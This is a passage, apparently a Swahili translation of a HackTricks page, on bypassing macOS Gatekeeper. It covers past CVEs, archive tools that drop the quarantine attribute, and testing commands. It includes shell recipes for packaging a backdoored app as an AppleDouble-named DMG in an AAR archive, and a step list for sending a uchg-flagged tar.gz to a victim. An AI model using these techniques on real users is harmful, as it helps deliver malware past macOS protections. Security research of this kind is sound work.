echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you download and decompress the resulting test.aar, test/._a won't have a quarantine attribute
```
Kuweza kuunda faili ambalo halitawekewa quarantine attribute, **iliwezekana kubypass Gatekeeper.** Mbinu ilikuwa **kuunda application ya DMG file** kwa kutumia AppleDouble name convention (kuanza na `._`) na kuunda **visible file kama sym link ya** faili hii iliyofichwa bila quarantine attribute.\
**dmg file inapotekelezwa**, kwa kuwa haina quarantine attribute, **itabypass Gatekeeper**.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### [CVE-2023-41067]

Apple ilirekebisha kosa la mantiki la LaunchServices katika macOS Sonoma 14.0 kupitia ukaguzi ulioboreshwa. Ushauri rasmi wa umma unasema tu kwamba app inaweza kupita Gatekeeper, kwa hivyo usikadirie aina mahususi ya carrier au mfululizo wa exploitation kwa kutegemea ingizo la CVE pekee.<sup>[[13]](#references)</sup>

### [CVE-2024-27853]

Gatekeeper bypass katika macOS 14.4 (iliyotolewa Machi 2024), iliyotokana na jinsi `libarchive` ilivyoshughulikia ZIP hasidi, iliwezesha apps kuepuka assessment. Update hadi 14.4 au toleo la baadaye, ambapo Apple ilirekebisha tatizo hilo.<sup>[[1]](#references)</sup>

### [CVE-2024-44128](https://support.apple.com/en-us/121234)

**Automator Quick Action workflow** iliyopachikwa kwenye app iliyopakuliwa inaweza kuanzishwa bila Gatekeeper assessment, kwa sababu workflows zilichukuliwa kama data na kutekelezwa na Automator helper nje ya njia ya kawaida ya notarization prompt. Kwa hivyo, `.app` iliyotengenezwa mahsusi na kubeba Quick Action inayoendesha shell script (kwa mfano, ndani ya `Contents/PlugIns/*.workflow/Contents/document.wflow`) inaweza kutekelezwa mara moja wakati wa launch. Apple iliongeza consent dialog ya ziada na kurekebisha assessment path katika Ventura **13.7**, Sonoma **14.7**, na Sequoia **15**.<sup>[[3]](#references)</sup>

### Kushindwa kwa usambazaji wa Quarantine kwenye mipaka ya extraction na kunakili

Utafiti wa 2024 ulipata mapengo ya usambazaji katika matoleo yaliyofanyiwa majaribio ya iZip (ZIP/TAR/7Z), Archiver (ARCHIVER/ZIP/TAR/7Z), BetterZip (ZIP/TAR/7Z), WinRAR (ZIP/TAR/7Z), na 7z Utility (DMG/ZIP/7Z); pia ulibaini kwamba attribute hiyo ilipotea wakati wa nakala kutoka VMware Tools kwenda guest. Vendors kadhaa baadaye walitangaza fixes, kwa hivyo chukulia majina haya kama leads za **retesting maalum kwa toleo**, si orodha ya kudumu ya software zilizo vulnerable. Tatizo hilo hilo la trust boundary linahusu workflows za native Unix: `curl`/`scp` haziongezi quarantine, na `tar`/`unzip` za command line hazirithi quarantine kiotomatiki kutoka kwa carrier archive.<sup>[[15]](#references)</sup>

Kwa offensive testing, linganisha carrier na app ya mwisho baada ya kila transition ya browser, mail client, archive, disk-image, cloud-sync, shared-folder, na VM-copy. Kukataliwa wazi na `spctl` hakurekebishi xattr iliyokosekana: bila quarantine, njia ya kawaida ya Gatekeeper ya first-open huenda isiwahi kuomba assessment hiyo.<sup>[[15]](#references)</sup>
```bash
# 1. Confirm the browser-downloaded carrier is quarantined
xattr -p com.apple.quarantine ./payload.zip

# 2. Extract/copy it through the application under test, then inspect the result
xattr -p com.apple.quarantine ./out/Payload.app || echo "QUARANTINE LOST"
spctl --assess --type execute -vv ./out/Payload.app

# 3. Enumerate every app bundle whose top-level directory lost the marker
find ./out -type d -name '*.app' -prune -exec sh -c \
'for app do xattr -p com.apple.quarantine "$app" >/dev/null 2>&1 || echo "$app"; done' sh {} +
```
### uchg (from this [talk](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

- Unda saraka iliyo na app.
- Ongeza uchg kwenye app.
- Compress app kuwa faili la tar.gz.
- Tuma faili la tar.gz kwa victim.
- Victim anafungua faili la tar.gz na kuendesha app.
- Gatekeeper haikagui app.<sup>[[12]](#references)</sup>

### Zuia Quarantine xattr

Katika bundle ya ".app", ikiwa quarantine xattr haijaongezwa ndani yake, unapoitekeleza **Gatekeeper haitawashwa**.

Angalia [macOS FS Tricks](macos-fs-tricks/README.md#avoid-quarantine-xattrs-tricks) kwa primitives zinazotegemea filesystem-, flag-, ACL-, na AppleDouble ambazo zinaweza kuzuia au kuondoa extended attributes.



## References

- [1] [Apple Platform Security: Kuhusu maudhui ya usalama ya macOS Sonoma 14.4 (inajumuisha CVE-2024-27853)](https://support.apple.com/en-us/HT214084)
- [2] [Eclectic Light: Jinsi macOS sasa inavyofuatilia provenance ya apps](https://eclecticlight.co/2023/05/10/how-macos-now-tracks-the-provenance-of-apps/)
- [3] [Apple: Kuhusu maudhui ya usalama ya macOS Sonoma 14.7 / Ventura 13.7 (CVE-2024-44128)](https://support.apple.com/en-us/121234)
- [4] [MacRumors: macOS 15 Sequoia imeondoa bypass ya Control-click “Open” ya Gatekeeper](https://www.macrumors.com/2024/08/06/macos-sequoia-gatekeeper-security-change/)
- [5] [WithSecure Labs: Ugunduzi wa CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)
- [6] [CVE-2021-30990, Kubypass macOS Gatekeeper](https://ronmasas.com/posts/bypass-macos-gatekeeper)
- [7] [Jamf Threat Labs imetambua vulnerability ya Safari inayoruhusu Gatekeeper bypass](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)
- [8] [Jamf Threat Labs imetambua vulnerability ya macOS Archive Utility inayoruhusu Gatekeeper bypass (CVE-2022-32910)](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/)
- [9] [Achilles heel ya Gatekeeper: Kugundua vulnerability ya macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [10] [F-Secure: Ugunduzi wa Gatekeeper Bypass (CVE-2023-27943)](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)
- [11] [Kupata na kuripoti exploit ya Gatekeeper bypass kwa msaada wa Mac Monitor](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)
- [12] [CODE BLUE 2023: Kubypass Security na Privacy Mechanisms za macOS — Kuanzia Gatekeeper hadi System Integrity Protection (Koh Nakagawa)](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf)
- [13] [Apple: Kuhusu maudhui ya usalama ya macOS Sonoma 14 (CVE-2023-41067)](https://support.apple.com/en-us/HT213940)
- [14] [Apple Developer Forums: Kujaribu product iliyo notarised](https://developer.apple.com/forums/thread/130560)
- [15] [Unit 42: Gatekeeper Bypass — Kugundua udhaifu katika security mechanism ya macOS](https://unit42.paloaltonetworks.com/gatekeeper-bypass-macos/)
{{#include ../../../banners/hacktricks-training.md}}
